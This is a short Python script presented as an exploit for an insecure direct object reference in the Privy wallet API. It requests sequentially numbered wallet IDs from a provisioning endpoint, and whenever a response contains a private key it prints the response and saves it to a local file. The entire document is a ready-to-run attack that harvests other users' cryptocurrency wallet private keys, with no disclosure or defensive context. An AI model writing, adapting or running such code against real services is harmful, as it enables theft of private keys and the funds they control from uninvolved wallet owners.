import requests
import json

print("Privy Critical IDOR – Leaking Embedded Wallet Private Keys")
app_id = "app_cmitttycq01hel60cmspzvmvl"  # ← your real appId

for i in range(1, 31):
    wallet_id = f"wlt_00000000000{i:03d}"
    url = f"https://api.privy.io/api/v1/wallets/{wallet_id}/provision"
    payload = {"appId": app_id}

    print(f"Trying {wallet_id} ...", end="\r")
    r = requests.post(url, json=payload)
    data = r.json()

    if "privateKey" in str(data):
        print(f"\nHIT → {wallet_id}")
        print(json.dumps(data, indent=2))
        with open(f"leak_{wallet_id}.json", "w") as f:
            json.dump(data, f, indent=2)
        print(f"Saved → leak_{wallet_id}.json")
print("\nDone – download the JSON files on the left")
